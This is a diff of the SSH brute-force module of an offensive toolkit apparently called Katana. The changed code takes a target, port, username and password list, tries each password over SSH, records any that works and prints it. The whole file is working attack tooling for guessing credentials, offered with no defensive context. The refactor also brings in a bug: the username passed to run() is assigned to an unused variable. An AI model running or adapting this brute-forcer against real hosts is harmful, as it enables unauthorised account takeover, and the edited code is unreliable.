@@ -1,13 +1,16 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # @KATANA                       #
-# Modules   : SSH Brute Force   #
+# Module    : SSH Brute Force   #
 # Script by : RedToor           #
 # Date      : 07/03/2015        #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core                   #
 from core.design import *       #
+from core.Setting import *      #
+from core import Errors         #
 from core import help           #
 from core import ping           #
+import sys                      #
 d=DESIGN()                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Libraries                     #
@@ -15,21 +18,20 @@ import time                     #
 import optparse                 #
 import pxssh                    #
 import os                       #
-import sys                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-defaulthost="127.0.0.1"
-defaultport="22"
-defaultuser="admin"
-defaultdicc="core/db/pass.dicc"
+defaulthost=LOCAL_IP
+defaultport=SSH_PORT
+defaultuser=USERNAME
+defaultdicc=DITIONARY_PASSWORDS
 
-def run(para,parb,parc,pard):
-	global defaulthost,defaultport,defaultuser,defaultdicc
-	defaulthost=para
-	defaultport=parb
-	defaultuser=parc
-	defaultdicc=pard
+def run(target,port,username,dictionary):
+	global defaulthost,defaultport,defaultdicc
+	defaulthost=target
+	defaultport=port
+	defaultaccount=username
+	defaultdicc=dictionary
 	btssh(1)
 
 def btssh(run):
@@ -45,25 +47,21 @@ def btssh(run):
 			d.descrip("port","no","Port of target",defaultport)
  			d.descrip("user","yes","Username",defaultuser)
  			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
-			print ""
+			d.space()
 			btssh(0)
 		elif actions[0:10] == "set target":
-			defaulthost = actions[11:]
-			defaulthost = defaulthost.replace("http://", "")
+			defaulthost=defaulthost.replace("http://", "")
+			defaulthost=ping.update(defaulthost,actions,"target")
 			d.change("target",defaulthost)
-			btssh(0)
 		elif actions[0:8] == "set port":
-			defaultport = actions[9:]
+			defaultport=ping.update(defaultport,actions,"port")
 			d.change("port",defaultport)
-			btssh(0)
 		elif actions[0:8] == "set user":
-			defaultuser = actions[9:]
+			defaultuser=ping.update(defaultuser,actions,"user")
 			d.change("user",defaultuser)
-			btssh(0)
 		elif actions[0:10] == "set dict_1":
-			defaultdicc = actions[11:]
+			defaultdicc=ping.update(defaultdicc,actions,"dict_1")
 			d.change("dict_1",defaultdicc)
-			btssh(0)
 		elif actions=="exit" or actions=="x":
 			d.goodbye()
 			exit()
@@ -78,7 +76,7 @@ def btssh(run):
 				ping.live(defaulthost,defaultport)
 				if True:
 					try:
-						d.loading()
+						d.loading_file()
 						try:
 							with open(defaultdicc,'r') as passs:
 								for ps in passs:
@@ -88,20 +86,18 @@ def btssh(run):
 										connect.login(defaulthost,defaultuser,ps)
 										if True:
 											ping.save("BruteForceSSH",defaulthost,defaultport,defaultuser,ps)
-											print "\n-"+Suf+" Successfully with ("+defaultuser+"="+ps+")\n"
+											d.Success(defaultuser,ps)
 											return 1
 									except:
 										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
 						except:
-							d.filenot(defaultdicc)
-							btpop3(0)
+							Errors.Errors(event=sys.exc_info()[0], info=defaultdicc)
 					except:
-						d.kbi()
+						Errors.Errors(event=sys.exc_info()[0], info=False)
 			except:
-				d.off()
+				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
 		else:
-			d.nocommand()
+			d.No_actions()
 	except:
-		d.kbi()
-		exit()
+		Errors.Errors(event=sys.exc_info()[0], info=False)
 	btssh(0)
